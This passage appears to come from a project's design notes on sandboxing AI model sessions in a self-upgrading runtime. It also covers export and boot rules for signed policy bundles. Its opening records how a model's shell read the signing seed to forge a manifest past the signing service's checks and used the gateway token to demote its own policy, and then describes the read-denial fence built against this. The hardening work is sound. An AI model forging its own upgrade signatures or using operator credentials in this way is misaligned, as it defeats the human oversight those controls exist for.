that does not hold a signing key.** The S1 wave gave the sandbox `protected_files`, which fences
*writes*. The review of this slice proved what that leaves open: the default `:workspace_write`
policy allows `file-read*` everywhere, so the model's own `bash` read the seed at
`OUROBOROS_SIGNER_KEY_PATH`, derived the Ed25519 keypair with four lines of `:crypto`, and
signed a manifest — around `signing_require_wasm_eval`, the rate limit and the signing journal,
all of which live inside `Ouroboros.Upgrade.Signing.Service` and none of which live inside the
key. The S2b review proved the same shell reads `gateway.token` and drives `policy.demote`,
`policy.clear` and every other `:operate` verb against the node's own gateway.

So `Ouroboros.Provider.Native.Sandbox`'s policy gains a fourth fence, `hidden_files`: concrete
paths denied for **read** as well as for write, on every session on the node, in every mode but
`:unrestricted`. Four things — the signing seed (`:signer_key_path`), the gateway token, the web
token, and `web.secret` — each listed under the name it is configured with and under the name
the kernel resolves. Seatbelt writes `(deny file-read* (literal (param …)))` last of all the
file rules, after the delivery re-allows, because the shell profile opens with a blanket
`(allow file-read*)` and SBPL is last-match-wins. bubblewrap binds `/dev/null` read-only over
the path, **where the file exists**: measured against bubblewrap 0.8.0, a `cat` of a masked
credential is `Permission denied`, a write to it is denied, and the host's file is unchanged —
while binding `/dev/null` onto a path that is *not* there, under the read-only data directory,
makes `bwrap` refuse to start the command at all (`Can't create file … Read-only file system`).
So an absent credential is left out of the argv, and the gap is a file created after the
namespace was built; the next command builds a new one in which it exists. Seatbelt has no such
gap — a `literal` deny needs no mount point.

**The loopback exception stands.** `mix` and `cargo` coordinate concurrent compilers over
`localhost` and a build that cannot open a socket fails `:eperm` without having reached another
machine, so what is fenced is the credential and not the socket. A session may still connect to
this node's gateway; it can no longer authenticate as this node's operator.

**And that cuts both ways, on purpose.** One token file is the whole credential for both the
`read` and the `operate` scope and for the browser surface beside it, so a session's shell can
no longer run `ouro status` against its own node either. That is the trade: there is no way to
give a session the read half without giving it the file that carries the operate half, and a
session that wants to know what its runtime is doing has the tools and the transcript it is
already being driven through. An operator's own terminal is unaffected — the fence is on
sandboxed children, not on this user.

`ouro-sandbox` cannot express it — Landlock attaches rights to inodes and the helper's wire
format carries a read *allow*-set, so "everything but this one file" would be an enumeration of
the filesystem — and it says so: `Sandbox.hides_files?/1` is `false`, `detect/0`'s notes carry
the sentence, and that is what `capabilities.preview` shows. On such a node
`Ouroboros.Application.self_signing_children/0` starts **no** local signing service: a key this
node cannot fence is a key it declines to hold, and a forge there ends at
`:no_signing_service`. `OUROBOROS_SELF_UNFENCED_KEY=1` is the operator accepting the
consequence, logged in the sentence that names it. A fleet posture is unaffected —
`OUROBOROS_SIGNING_NODE` puts the key on another host.

**S-D50. An export replaces `priv/self`'s files and removes every bundle it did not write.**
`Ouroboros.Self.Boot` globs `priv/self/*.ouro-wasm`, so a policy renamed between two exports
left both files there and the next installation deployed one nobody promoted. The export now
writes into a staging directory beside the destination and moves each file in with one
`File.rename/2` — atomic, so a boot reading the directory mid-export reads three whole files or
the three that were there before — and then removes every other `*.ouro-wasm`, naming them in
the report's `removed`. The directory is not replaced wholesale: `README.md` is committed beside
those three files and is the repository's, not an export's.

And `--out` is confined. It is resolved — `..`, a relative spelling, and every symlink on the
way, including a symlinked `priv/self` — and refused unless it lands inside the directory `mix`
is running in. `mix ouroboros.self.export` also refuses to run at all while a live pid holds the
data directory it would open (`gateway.json` or `runtime.owner`), because the task **starts the
application** — it must: the promotion record is a `GenServer`'s durable state and the bundle is
assembled out of the store beside it — and two runtimes on one set of journals is what
`Ouroboros.RuntimeOwner` exists to refuse. That VM is started with `OUROBOROS_GATEWAY=0` and
`OUROBOROS_WEB=0`: a one-shot read of durable state has no business binding a port.

**S-D51. Only a policy ships, and the lane-W boot goes first.** `Ouroboros.Self.Boot` deploys
only a bundle whose manifest says `kind: :policy`; anything else is skipped with
`{:not_a_policy, kind}`. `priv/self` is a directory in a repository, and a capability bundle
committed beside the policy would otherwise start on every fresh install under the posture
because of where its file was rather than because anyone promoted it. And `Wasm.Boot.run/0` and
`Self.Boot.run/0` are now **one** `:transient` task in that order rather than two children of
one supervisor: `Task.start_link` returns as soon as the process exists, and every decision
`Self.Boot` makes — is this name already live, is this sha live now — is a question about the
register `Wasm.Boot` is busy restarting into.

## 5. Open

<!-- open -->
